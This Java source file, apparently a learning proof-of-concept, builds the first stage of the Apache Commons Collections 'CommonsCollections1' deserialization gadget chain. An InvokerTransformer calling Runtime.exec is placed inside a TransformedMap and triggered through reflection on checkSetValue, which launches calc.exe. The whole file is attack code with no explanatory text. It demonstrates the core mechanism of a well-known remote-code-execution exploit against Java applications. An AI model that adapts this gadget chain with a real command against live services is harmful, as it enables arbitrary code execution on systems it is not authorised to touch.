
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.TransformedMap;

import java.lang.reflect.InvocationTargetException;
import java.util.HashMap;
import java.util.Map;


import java.lang.reflect.Method;

public class CommonCollections1 {
    public static void main(String[] args) throws ClassNotFoundException, NoSuchMethodException, InvocationTargetException, IllegalAccessException {
        Runtime runtime = Runtime.getRuntime();
        Map map = new HashMap();
        InvokerTransformer invokerTransformer = new InvokerTransformer("exec", new Class[]{String.class}
                , new Object[]{"C:\\WINDOWS\\system32\\calc.exe"});

        Map tranformedMap = TransformedMap.decorate(map, null, invokerTransformer);

        Class transformedMapClass = Class.forName("org.apache.commons.collections.map.TransformedMap");

        Method checkSetValueMethod = transformedMapClass.getDeclaredMethod("checkSetValue", Object.class);
        checkSetValueMethod.setAccessible(true);
        checkSetValueMethod.invoke(tranformedMap, runtime);

    }
}
